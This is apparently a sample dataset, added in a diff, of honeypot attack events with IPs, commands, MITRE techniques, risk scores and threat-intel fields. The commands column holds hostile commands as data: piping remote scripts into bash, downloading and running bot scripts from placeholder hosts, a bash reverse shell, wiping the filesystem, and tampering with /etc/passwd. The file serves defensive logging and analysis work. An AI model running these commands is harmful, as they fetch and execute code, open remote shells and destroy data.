@@ -1,0 +1,99 @@
+﻿id;timestamp;honeypot;ip_origen;puerto_destino;protocolo;usuario;comandos;tecnica_mitre;risk_score;severidad;malware_hash;abuseipdb_confidence;abuseipdb_country;shodan_org;vt_detections;domain_age_days
+101;2026-08-25 03:02:00;dionaea;1.2.3.4;445;smb;;;T1190;0.7;high;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855;;;;;
+100;2026-08-25 03:01:00;cowrie;185.220.101.5;2222;ssh;admin;wget http://example.com/payload.sh;T1059;1.0;critical;;100;DE;;0;12655
+99;2026-08-25 03:00:00;cowrie;8.8.8.8;2222;ssh;root;id;T1059;0.4;medium;;0;US;Google LLC;0;N/A
+98;2026-08-25 01:20:05;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;6895
+97;2026-08-25 01:18:48;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;6895
+96;2026-08-25 01:13:25;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;N/A
+95;2026-08-25 01:07:56;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;N/A
+94;2026-08-25 01:01:58;cowrie;45.33.32.156;;ssh;;curl http://github.com/payload.sh | bash;T1059;1.0;critical;;13;US;Linode;0;N/A
+93;2026-08-25 00:41:54;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;1.0;critical;;13;US;Linode;0;N/A
+92;2026-08-25 00:35:20;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
+90;2026-08-25 00:30:59;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
+89;2026-08-25 00:29:02;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
+88;2026-08-25 00:24:36;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
+87;2026-08-25 00:22:46;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
+86;2026-08-25 00:08:08;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
+84;2026-08-24 23:45:28;cowrie;45.33.32.156;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
+83;2026-08-24 23:39:04;cowrie;118.25.6.39;2222;ssh;root;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;0;N/A
+91;2026-08-24 23:31:44;cowrie;118.25.6.39;2222;ssh;root;wget http://example-payload.test/bot.sh;T1059;0.7;high;;;;;0;N/A
+82;2026-08-24 23:20:00;cowrie;118.25.6.39;2222;ssh;root;"rm -rf / --no-preserve-root; wget http://example-payload.test/bot.sh && ./bot.sh";T1059;0.9;critical;;;;;0;N/A
+81;2026-08-24 23:10:00;cowrie;118.25.6.39;2222;ssh;root;"rm -rf / --no-preserve-root; wget http://example-payload.test/bot.sh && ./bot.sh";T1059;0.0;low;;;;;;
+85;2026-08-24 23:05:00;cowrie;118.25.6.39;2222;ssh;root;wget http://example-payload.test/bot.sh && chmod +x bot.sh && ./bot.sh;T1059;0.7;high;;;;;0;N/A
+80;2026-08-24 18:02:56;cowrie;203.0.113.50;2222;ssh;root;curl http://malicious-example.com/payload.sh | bash;T1059;0.85;critical;;;;;0;N/A
+79;2026-08-24 16:17:00;cowrie;203.0.113.63;22;ssh;root;whoami;T1059;0.4;medium;;;;;0;N/A
+78;2026-08-24 16:17:00;cowrie;203.0.113.62;22;ssh;root;echo h4x >> /etc/passwd;T1059;0.85;critical;;;;;0;N/A
+77;2026-08-24 16:17:00;cowrie;203.0.113.61;22;ssh;root;cat /etc/passwd;T1059;0.74;high;;;;;0;N/A
+76;2026-08-24 15:55:00;cowrie;203.0.113.90;22;ssh;;;T1595;0.0;low;;;;;;
+75;2026-08-24 15:47:30;dionaea;198.51.100.9;445;smb;;;T1190;0.7;high;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;;;;;
+74;2026-08-24 15:47:00;cowrie;203.0.113.78;22;ssh;test;whoami;T1059;0.4;medium;;;;;0;N/A
+73;2026-08-24 15:45:00;cowrie;203.0.113.77;22;ssh;root;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1;T1059;0.9;critical;;;;;0;N/A
+71;2026-08-24 15:22:53;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+72;2026-08-24 12:00:00;cowrie;203.0.113.50;22;ssh;root;rm -rf / --no-preserve-root && wget http://evil.example.com/x.sh | sh;T1059;0.95;critical;;;;;;
+70;2026-08-23 06:18:41;cowrie;203.0.113.91;;ssh;;whoami;T1059;0.4;medium;;;;;;
+69;2026-08-23 06:18:38;cowrie;203.0.113.90;;ssh;;rm -rf / --no-preserve-root;T1059;0.9;critical;;;;;;
+68;2026-08-23 05:42:57;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+67;2026-08-23 05:39:18;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+65;2026-08-23 05:25:00;dionaea;192.0.2.44;445;smb;;;T1190;0.0;low;;;;;;
+66;2026-08-23 05:24:09;cowrie;203.0.113.88;2222;ssh;root;id;T1059;0.4;medium;;;;;;
+64;2026-08-23 05:24:09;cowrie;203.0.113.88;2222;ssh;root;id;T1059;0.4;medium;;;;;;
+63;2026-08-23 05:19:55;cowrie;203.0.113.66;2222;ssh;root;;T1595;0.0;low;;;;;;
+61;2026-08-21 01:20:30;dionaea;192.0.2.30;445;smb;;;T1190;0.0;low;;;;;;
+62;2026-08-21 01:20:00;cowrie;203.0.113.50;2222;ssh;root;uname -a;T1059;0.4;medium;;;;;;
+60;2026-08-21 01:20:00;cowrie;203.0.113.50;2222;ssh;root;uname -a;T1059;0.4;medium;;;;;;
+59;2026-08-14 01:42:37;cowrie;172.20.0.1;2222;ssh;;;T1595;0.0;low;;;;;;
+58;2026-08-14 01:42:36;cowrie;172.20.0.1;2222;ssh;;;T1595;0.0;low;;;;;;
+57;2026-08-14 01:42:36;cowrie;172.20.0.1;2222;ssh;;;T1595;0.0;low;;;;;;
+56;2026-08-14 01:42:36;cowrie;172.20.0.1;2222;ssh;;;T1595;0.0;low;;;;;;
+55;2026-08-13 02:02:53;dionaea;172.20.0.1;21;ftpd;;;T1190;0.0;low;;;;;;
+54;2026-08-13 02:02:53;dionaea;172.20.0.1;1433;mssqld;;;T1190;0.0;low;;;;;;
+52;2026-08-13 01:57:09;dionaea;172.20.0.7;38929;TftpClient;;;T1190;0.0;low;;;;;;
+53;2026-08-13 01:57:09;dionaea;172.20.0.1;1433;mssqld;;;T1190;0.0;low;44d88612fea8a8f36de82e1278abb02f;;;;;
+51;2026-08-13 01:56:27;dionaea;172.20.0.1;1433;mssqld;;;T1190;0.0;low;;;;;;
+50;2026-08-13 01:28:25;dionaea;172.20.0.1;1433;mssqld;;;T1190;0.0;low;;;;;;
+49;2026-08-12 22:42:55;dionaea;172.20.0.1;21;ftpd;;;T1190;0.0;low;;;;;;
+48;2026-08-12 22:41:14;dionaea;0.0.0.0;;smb;;;T1190;0.0;low;;;;;;
+47;2026-08-12 22:38:10;dionaea;0.0.0.0;;smb;;;T1190;0.0;low;;;;;;
+45;2026-08-12 03:00:00;cowrie;203.0.113.9;;ssh;probe;;T1595;0.0;low;;;;;;
+46;2026-08-12 02:52:44;dionaea;0.0.0.0;;smb;;;T1190;0.0;low;;;;;;
+44;2026-08-12 02:50:06;cowrie;172.20.0.1;2223;telnet;;;T1595;0.0;low;;;;;;
+43;2026-08-12 02:50:06;cowrie;172.20.0.1;2223;telnet;;;T1595;0.0;low;;;;;;
+42;2026-08-12 02:50:05;cowrie;172.20.0.1;2223;telnet;;;T1595;0.0;low;;;;;;
+41;2026-08-12 02:50:05;cowrie;172.20.0.1;2223;telnet;brute_user;;T1595;0.0;low;;;;;;
+40;2026-08-12 02:50:05;cowrie;172.20.0.1;2223;telnet;;;T1595;0.0;low;;;;;;
+39;2026-08-12 02:46:03;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+38;2026-08-12 02:46:01;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+37;2026-08-12 02:46:01;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+36;2026-08-12 02:46:00;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+35;2026-08-12 02:45:59;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+34;2026-08-12 02:45:57;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+33;2026-08-12 02:45:56;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+32;2026-08-12 02:45:55;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+31;2026-08-12 02:45:53;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+30;2026-08-12 02:31:50;dionaea;0.0.0.0;;smb;;;T1190;0.0;low;;;;;;
+29;2026-08-12 02:31:49;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+28;2026-08-12 02:31:37;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+27;2026-08-11 04:57:51;cowrie;198.51.100.7;2222;ssh;;;T1595;0.0;low;;;;;;
+26;2026-08-11 04:52:23;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+25;2026-08-11 04:52:23;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+24;2026-08-11 04:46:04;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+23;2026-08-11 04:46:04;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+22;2026-08-11 04:44:45;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+21;2026-08-11 04:44:45;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+19;2026-08-11 04:36:57;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+17;2026-08-11 04:29:01;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+16;2026-08-11 04:26:18;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+15;2026-08-11 04:25:00;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+14;2026-08-11 04:12:59;cowrie;203.0.113.99;2222;ssh;root;wget http://evil.example.com/x.sh;T1059;0.7;high;;;;;;
+12;2026-08-11 03:48:35;cowrie;185.220.101.34;2222;ssh;root;uname -a;T1059;0.4;medium;;;;;;
+13;2026-08-11 03:48:35;cowrie;185.220.101.34;2222;ssh;;;T1595;0.0;low;;;;;;
+11;2026-08-11 03:42:54;cowrie;185.220.101.34;2222;ssh;;;T1595;0.0;low;;;;;;
+10;2026-08-11 03:42:47;cowrie;185.220.101.34;2222;ssh;root;uname -a;T1059;0.4;medium;;;;;;
+8;2026-08-11 03:40:29;cowrie;185.220.101.34;2222;ssh;;;T1595;0.0;low;;;;;;
+9;2026-08-11 03:40:29;cowrie;185.220.101.34;2222;ssh;root;uname -a;T1059;0.4;medium;;;;;;
+7;2026-08-11 03:31:39;cowrie;185.220.101.34;2222;ssh;root;uname -a;T1059;0.4;medium;;;;;;
+6;2026-08-11 03:31:39;cowrie;185.220.101.34;2222;ssh;;;T1595;0.0;low;;;;;;
+4;2026-08-11 03:17:36;cowrie;185.220.101.34;2222;ssh;;;T1595;0.0;low;;;;;;
+5;2026-08-11 03:17:36;cowrie;185.220.101.34;2222;ssh;root;uname -a;T1059;0.4;medium;;;;;;
+3;2026-08-10 21:04:59;cowrie;0.0.0.0;;ssh;;;T1595;0.0;low;;;;;;
+2;2026-08-10 20:37:31;dionaea;0.0.0.0;;smb;;;T1190;0.0;low;;;;;;
